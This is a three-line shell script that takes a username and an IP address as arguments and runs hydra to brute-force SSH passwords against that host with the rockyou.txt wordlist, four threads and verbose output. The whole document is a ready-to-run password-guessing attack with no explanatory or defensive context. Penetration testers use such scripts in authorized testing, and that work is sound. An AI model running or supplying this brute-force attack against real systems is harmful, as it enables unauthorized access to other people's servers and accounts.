user="$1"
ip="$2"
hydra -l "$user" -P ~/Tools/rockyou.txt ssh://"$ip" -t 4 -V
